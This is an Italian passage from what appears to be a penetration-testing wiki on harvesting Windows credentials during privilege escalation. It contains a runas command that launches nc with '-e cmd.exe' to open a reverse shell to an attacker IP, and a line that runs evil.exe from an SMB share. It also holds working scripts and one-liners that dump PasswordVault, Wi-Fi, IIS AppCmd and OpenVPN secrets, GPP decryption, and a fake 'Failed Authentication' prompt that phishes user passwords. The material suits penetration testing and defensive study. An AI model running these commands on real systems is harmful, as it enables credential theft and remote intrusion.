A meno che le applicazioni non interagiscano con Gestione credenziali, non credo sia possibile che usino le credenziali per una determinata risorsa. Quindi, se la tua applicazione vuole usare il vault, dovrebbe in qualche modo **comunicare con Gestione credenziali e richiedere le credenziali per quella risorsa** dal vault di archiviazione predefinito.

Usa `cmdkey` per elencare le credenziali archiviate sulla macchina.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Quindi puoi usare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. L'esempio seguente richiama un binario remoto tramite una condivisione SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Utilizzo di `runas` con un set di credenziali fornito.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) o il [modulo Powershells di Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Le moderne applicazioni UWP di Windows, Microsoft Edge e i moderni servizi di sistema archiviano token di autenticazione e password in testo semplice all'interno di `PasswordVault` della Universal Windows Platform (UWP) (esposto anche come `Web Credentials` in `vaultcmd`). Questo spazio di archiviazione è isolato per sessione e può essere decrittato nativamente senza privilegi amministrativi o `SeDebugPrivilege`.

Esegui questo comando PowerShell nella sessione attiva dell'utente per scaricare e decrittare immediatamente tutti i nomi utente e le password in testo semplice archiviati:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la cifratura simmetrica dei dati, utilizzato prevalentemente nel sistema operativo Windows per cifrare in modo simmetrico le chiavi private asimmetriche. Questa cifratura sfrutta un segreto dell'utente o del sistema, che contribuisce in modo significativo all'entropia.

**DPAPI consente di cifrare le chiavi mediante una chiave simmetrica derivata dai segreti di accesso dell'utente**. Negli scenari che prevedono la cifratura di sistema, utilizza i segreti di autenticazione del dominio del sistema.

Le chiavi RSA utente cifrate tramite DPAPI vengono archiviate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta l'[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, che si trova insieme alla master key che protegge le chiavi private dell'utente nello stesso file**, è in genere composta da 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è limitato, impedendo di elencarne il contenuto con il comando `dir` in CMD, anche se è possibile farlo tramite PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Puoi usare il **modulo mimikatz** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decrittarlo.

I **file delle credenziali protetti dalla password principale** si trovano solitamente in:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` con il `/masterkey` appropriato per decrittare.\
Puoi **estrarre molte** **masterkey DPAPI** dalla **memoria** con il modulo `sekurlsa::dpapi` (se sei root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenziali PowerShell

Le **credenziali PowerShell** vengono spesso usate per attività di **scripting** e automazione, così da archiviare comodamente credenziali crittografate. Le credenziali sono protette da **DPAPI**, il che in genere significa che possono essere decrittate solo dallo stesso utente sullo stesso computer su cui sono state create.

Una credenziale esportata può avere un nome di file o un percorso `.xml` arbitrario. Quando uno script o un inventario di file ne segnala una, individua la directory del profilo effettiva dell'account invece di presumere che sia `C:\Users`: [Windows può collocare i profili altrove](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Un file leggibile è solo un indizio; [Windows `Export-Clixml` associa una credenziale crittografata all'utente e al computer che l'hanno esportata](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), e qualsiasi account recuperato deve avere separatamente i diritti necessari sul servizio previsto. Esamina prima i percorsi e le ACL, senza stampare valori crittografati o in testo in chiaro durante la normale enumerazione.

Per **decrittare** le credenziali PS dal file che le contiene, puoi eseguire:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Connessioni RDP salvate

Puoi trovarle in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Comandi eseguiti di recente

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Gestione credenziali Desktop remoto**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Usa il modulo `dpapi::rdg` di **Mimikatz** con il `/masterkey` appropriato per **decrittare qualsiasi file .rdg**\
Puoi **estrarre molte DPAPI masterkey** dalla memoria con il modulo `sekurlsa::dpapi` di Mimikatz

**mRemoteNG usa un archivio delle connessioni diverso.** Esamina i file XML leggibili in `%APPDATA%\mRemoteNG` e nei Documenti dell'utente, compresi i file con nomi comuni come `config.xml`. Individua lo schema delle connessioni e gli attributi `Password` cifrati prima di considerare un file XML una possibile fonte di credenziali. Il valore archiviato non è una password DPAPI/RDCMan; il recupero dipende dalle impostazioni di cifratura del file e dall'eventuale uso di una master password personalizzata. Evita di stampare i valori cifrati durante un'enumerazione estesa.

Le **esportazioni dei profili di Remote Desktop Plus** potrebbero essere leggibili anche nelle directory dell'utente o in una cartella di amministrazione condivisa. Un'esportazione legacy `profiles.xml` contiene voci `Data/Profile` con gli elementi `ProfileName`, `Password` e `Secure`. Considera un elemento password non vuoto come una possibile fonte di credenziali, senza stamparlo né presumere che sia in testo semplice: [il produttore segnala](https://www.donkz.nl/) che la protezione dei profili può essere associata all'account e al computer usati per crearli, oppure configurata in modo meno rigoroso. Verifica l'origine del file e le condizioni di recupero prima di farvi affidamento.

### Sticky Notes

A volte le persone salvano password e altre informazioni nelle applicazioni per le note adesive. L'app Sticky Notes pacchettizzata di Microsoft archivia comunemente le note in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; le app più vecchie o diverse potrebbero usare altri archivi nel profilo utente, incluso LevelDB. Individua l'app installata e il formato di archiviazione prima di considerare l'assenza del file SQLite come prova che non ci siano note.

Se Sticky Notes usa il write-ahead logging di SQLite, una copia del solo `plum.sqlite` potrebbe non includere le note recenti già salvate. Conserva il file `plum.sqlite-wal` corrispondente insieme a una copia coerente del database e includi `plum.sqlite-shm` se disponibile; l'indice in memoria condivisa può essere ricostruito, ma il WAL fa parte dello stato persistente del database. Consulta la [documentazione WAL di SQLite](https://www.sqlite.org/wal.html). Una nota contenente il nome di un account o una password è solo una possibile fonte di credenziali: verifica separatamente l'account, gli accessi consentiti e l'eventuale riutilizzo della password. Un record cifrato di un password manager richiede inoltre la chiave di decrittazione effettiva e un'interpretazione specifica dell'applicazione prima di poter dimostrare l'accesso con privilegi superiori.

### AppCmd.exe

**Nota: per recuperare le password da AppCmd.exe devi essere Administrator e avviarlo con un livello di integrità High Integrity.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\
Se questo file esiste, è possibile che siano state configurate alcune **credenziali** e che sia possibile **recuperarle**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Verifica se esiste `C:\Windows\CCM\SCClient.exe`.\
Gli installer vengono **eseguiti con privilegi SYSTEM** e molti sono vulnerabili al **DLL Sideloading (info da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## File e registro (credenziali)

### Artefatti di credenziali nel registro degli strumenti di supporto

Alcune installazioni meno recenti di strumenti di supporto remoto conservano nomi di valori relativi alle password in chiavi fisse del registro dell'applicazione. Per esempio, secondo la [spiegazione del vendor sulle chiavi del registro](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), nelle versioni precedenti alla 9 il valore `SecurityPasswordAES` di TeamViewer indicava una password di sessione statica configurata. Un nome di valore è solo un indizio da verificare: controlla la versione installata, i dati del valore accessibili in lettura, il formato e il comportamento di autenticazione attuale prima di valutare quella credenziale. Il passaggio da una password di supporto remoto a un account Windows con privilegi maggiori richiede inoltre che la password sia effettivamente riutilizzata e che l'account sia autorizzato. Non includere testi cifrati e password recuperate nei risultati delle normali attività di enumerazione.

### Fogli di calcolo condivisi con fogli protetti

Se si sospetta che una cartella di lavoro condivisa e accessibile in lettura contenga dati di account, distingui la **cifratura del file** dalla protezione del foglio di lavoro o dalle colonne nascoste. [Microsoft afferma](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) che la protezione del foglio di lavoro controlla le modifiche e non è una funzionalità di sicurezza; da sola non dimostra che il contenuto della cartella di lavoro sia cifrato. Esamina solo i file pertinenti e a cui sei autorizzato ad accedere, ed evita di stampare possibili segreti durante l'enumerazione estesa. Un percorso `.xlsx` leggibile, un foglio protetto o una colonna nascosta non dimostrano da soli che esistano credenziali o che un account abbia privilegi maggiori; verifica separatamente i dati effettivi e i diritti attuali dell'account.

### Patch delle modifiche conservate dal server CI

Un server CI può conservare le modifiche al codice sorgente inviate nella propria directory dati anche dopo il completamento della build. [TeamCity documenta](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` come posizione in cui archiviare le modifiche eseguite da remoto; la directory dati può essere configurata e non si trova necessariamente in `ProgramData`. Una patch leggibile può conservare riferimenti aggiunti o rimossi a un file di credenziali, a una chiave di cifratura o a uno script che li usa entrambi. Per esempio, un workflow PowerShell con `ConvertTo-SecureString -Key` richiede sia la chiave AES sia la stringa cifrata; [Microsoft documenta](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) che la chiave viene fornita separatamente. Esamina prima solo i nomi delle patch accessibili, poi, se autorizzato, ispeziona i contenuti pertinenti senza stampare segreti nei risultati delle normali attività di enumerazione. Un percorso di patch, un valore cifrato o un riferimento a una chiave non dimostrano da soli l'esistenza di credenziali valide o l'accesso a privilegi maggiori. Limita le ACL della directory dati ed evita di includere segreti nelle modifiche della build.

### Rotazione personalizzata della password dell'amministratore locale

Un sistema di rotazione delle password sviluppato internamente potrebbe memorizzare una password cifrata dell'amministratore locale in un servizio locale, conservando le credenziali del datastore in un file `.env` leggibile o accanto al binario dell'updater. Esamina insieme il task pianificato dell'updater, l'account, le ACL di configurazione, il listener e le autorizzazioni del datastore. Un datastore accessibile solo tramite loopback è comunque raggiungibile da un utente locale con credenziali valide, ma la sola autenticazione non dimostra che abbia i permessi per leggere i record pertinenti. Se il seed di cifratura o il materiale della chiave sono accessibili accanto al testo cifrato, verifica il metodo esatto di derivazione della chiave prima di considerare affidabile la cifratura. Uno schema che deriva in modo deterministico una chiave AES da un seed esposto usando Go [`math/rand`](https://pkg.go.dev/math/rand) non è adatto a proteggere quella password; Go documenta che quel pacchetto non è indicato per la generazione di valori casuali sensibili alla sicurezza. Prima di considerare una password recuperata come possibile via di escalation, verifica che sia attuale e appartenga a un account del gruppo Administrators locale. Un task pianificato, un percorso `.env` o un blob cifrato non dimostrano da soli nessuna di queste condizioni. Non includere password e materiale delle chiavi nei risultati delle normali attività di enumerazione.

Usa [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) per gestire le password degli amministratori locali. L'archiviazione e i controlli di accesso basati su directory o Entra sono distinti da un datastore locale personalizzato; anche i [ruoli Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) determinano se un utente autenticato del datastore può leggere uno specifico indice.

### Archivi di plugin Java server e riutilizzo delle credenziali

Alcuni plugin per server Java vengono distribuiti come archivi JAR nella directory `plugins` di un server. Un plugin personalizzato accessibile in lettura potrebbe contenere configurazioni o bytecode con credenziali di servizio incorporate. Esamina l'archivio solo se autorizzato e non includere segreti recuperati nei risultati delle normali attività di enumerazione. Il solo percorso del plugin non dimostra che esista un segreto; una password di servizio recuperata consente di ottenere privilegi maggiori solo se è valida anche per un account con privilegi superiori. Controlla le ACL dei file pertinenti e sostituisci le credenziali riutilizzate con segreti distinti. Consulta la [guida all'installazione dei plugin di PaperMC](https://docs.papermc.io/paper/adding-plugins/) per la struttura delle directory e la [documentazione JAR di Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) per i contenuti degli archivi.

### Credenziali del database integrato di Openfire

Un'installazione di Openfire che utilizza il database integrato potrebbe conservare `openfire.script` in `Openfire\embedded-db`. Se l'account corrente può leggerlo, esamina insieme i record `OFUSER` e la proprietà `passwordKey`. La [documentazione del provider utenti](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) di Openfire afferma che le password possono essere archiviate in testo normale o cifrate con una chiave contenuta in quella proprietà. Una password recuperata è rilevante per l'escalation solo se è ancora valida per un'identità con privilegi maggiori; il nome del file da solo non dimostra né l'accesso in lettura né il riutilizzo della credenziale. Il percorso è un indizio per l'inventario: non includere il contenuto del database e le credenziali nei risultati delle normali attività di enumerazione.

Il file separato `Openfire\conf\openfire.xml` può rivelare le porte configurate per la console di amministrazione e l'interfaccia di bind, anche quando viene usato un database esterno. Openfire associa comunemente la console di amministrazione all'interfaccia loopback; se il listener è in esecuzione, un account locale può comunque raggiungere quell'indirizzo. Verifica insieme il listener effettivo, il ruolo di amministratore autorizzato, la policy di caricamento dei plugin e l'identità del servizio Openfire. Un amministratore che può installare un plugin potrebbe far eseguire il codice del plugin nel contesto del servizio, che può avere privilegi elevati se il servizio viene eseguito come LocalSystem. Una password corrispondente o un percorso di configurazione leggibile non dimostrano da soli l'accesso alla console di amministrazione né l'esecuzione di codice. Consulta la [guida del vendor all'installazione e alla gestione dei plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) e la [proprietà dell'API per il caricamento dei plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configurazione del server di gestione forense

Le configurazioni del server Velociraptor, spesso denominate `server.config.yaml`, possono contenere `CA.private_key` della CA interna. Se un utente con privilegi inferiori può leggere quella chiave, potrebbe riuscire a creare un certificato client API. La possibilità di ottenere privilegi maggiori dipende dai ruoli utente del server, dalla raggiungibilità dell'API e dall'identità con cui vengono eseguiti il server o l'agent di destinazione. Una configurazione client contiene materiale diverso; trovarne una non dimostra l'accesso alla CA del server. Alcune distribuzioni conservano la chiave privata della CA offline, quindi una configurazione del server leggibile potrebbe non contenere la chiave di firma.

Su un server Windows, controlla le ACL della configurazione del **server** nella directory di installazione e di eventuali copie di backup protette. Un possibile percorso è `%ProgramFiles%\VelociraptorServer\server.config.yaml`; se il percorso configurato per il servizio è diverso, usa quello. Verifica che l'identità corrente possa leggere il file e che `CA.private_key` sia effettivamente presente. Evita di stampare la chiave privata nei log o nei risultati dell'enumerazione. Il workflow vendor `config api_client` usa la chiave della CA per rilasciare un certificato client, ma serve anche un ruolo effettivo lato server; crearne o modificarne uno può richiedere l'accesso in scrittura al datastore o un riavvio. Un'identità privilegiata già esistente sul server può offrire una via anche quando non sono disponibili tali permessi di scrittura. Le query API con diritti di esecuzione vengono eseguite nel contesto pertinente del server o dell'agent, che può avere privilegi elevati.

Proteggi la configurazione del server e i backup con ACL restrittive, conserva offline la chiave di firma della CA quando possibile e limita i ruoli API e l'accesso ai listener. Consulta la [documentazione API di Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) e le [indicazioni sulla configurazione di sicurezza](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY è un gestore di sessioni separato. Il suo archivio nativo cifrato potrebbe trovarsi in `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, mentre un backup delle sessioni esportato potrebbe chiamarsi `sessions-backup.dat` ed essere archiviato altrove. La [guida all’esportazione di SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) afferma che le esportazioni sono cifrate con password e possono contenere sessioni, chiavi, script, tag e relazioni; il [forum di supporto](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) indica l’archivio nativo. Controlla prima i permessi dei file e i percorsi. Trovare uno dei due file non ne rivela la password né dimostra che le credenziali salvate siano ancora valide o dispongano di privilegi superiori.

### Chiavi host SSH di PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Chiavi SSH nel registro

Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi controlla se contiene qualcosa di interessante:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Se trovi una voce in quel percorso, probabilmente si tratta di una chiave SSH salvata. È memorizzata in forma crittografata, ma può essere facilmente decifrata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maggiori informazioni su questa tecnica sono disponibili qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Se il servizio `ssh-agent` non è in esecuzione e vuoi che si avvii automaticamente all'avvio del sistema, esegui:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune chiavi SSH, aggiungerle con `ssh-add` e accedere a una macchina via SSH. La chiave del registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha rilevato l'uso di `dpapi.dll` durante l'autenticazione con chiave asimmetrica.

### File non presidiati

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Puoi anche cercare questi file usando **metasploit**: _post/windows/gather/enum_unattend_

Contenuto di esempio:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Backup di SAM e SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

I file di backup Windows Imaging (`.wim`) leggibili possono contenere anche hive `SAM`, `SECURITY` e `SYSTEM` offline. Dai priorità alle directory di backup o delle immagini accessibili localmente e controlla i **nomi dei membri** dell'immagine prima di estrarre qualsiasi cosa: il solo nome di un file `.wim` non dimostra che gli hive siano esposti, e le comuni immagini `install.wim`, `boot.wim` e di ripristino sono spesso false piste. Una condivisione SMB è un percorso di accesso separato e va verificata solo se rientra nell'ambito. Consulta le [indicazioni di Microsoft sulle immagini Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) e il [riferimento ai file degli hive del registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Credenziali cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Password GPP memorizzata nella cache

In passato era disponibile una funzionalità che consentiva di distribuire account amministratore locali personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava gravi vulnerabilità di sicurezza. Innanzitutto, gli oggetti Criteri di gruppo (GPO), archiviati come file XML in SYSVOL, erano accessibili a qualsiasi utente del dominio. In secondo luogo, le password contenute in questi GPP, crittografate con AES256 usando una chiave predefinita documentata pubblicamente, potevano essere decrittate da qualsiasi utente autenticato. Ciò comportava un grave rischio, poiché gli utenti avrebbero potuto ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione che cerca i file GPP memorizzati nella cache locale e contenenti un campo "cpassword" non vuoto. Quando trova un file di questo tipo, la funzione decritta la password e restituisce un oggetto PowerShell personalizzato. L'oggetto include dettagli sul GPP e sul percorso del file, facilitando l'identificazione e la correzione di questa vulnerabilità di sicurezza.

Cerca questi file in `C:\ProgramData\Microsoft\Group Policy\history` o in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (versioni precedenti a W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decrittare il cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Usare crackmapexec per ottenere le password:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Configurazione Web IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Esempio di web.config con credenziali:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archivi di backup in una webroot IIS

Un vecchio backup ZIP collocato direttamente in una webroot accessibile tramite web può esporre file di configurazione precedenti e credenziali riutilizzabili. Controlla il percorso fisico configurato per il sito e verifica che l’archivio sia effettivamente raggiungibile via HTTP prima di considerarlo un’esposizione. Il percorso predefinito `C:\inetpub\wwwroot` è solo un possibile candidato. Un rapido inventario locale può elencare nomi e dimensioni senza aprire gli archivi:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Un nome di archivio non dimostra che contenga un segreto né che una credenziale recuperata conceda privilegi più elevati.

### Credenziali OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Log

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Chiedere le credenziali

Puoi sempre **chiedere all'utente di inserire le proprie credenziali o persino quelle di un altro utente**, se pensi che possa conoscerle (nota che chiedere direttamente al client le **credenziali** è davvero **rischioso**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Possibili nomi di file contenenti credenziali**

File noti che in passato contenevano **password** in **testo in chiaro** o **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
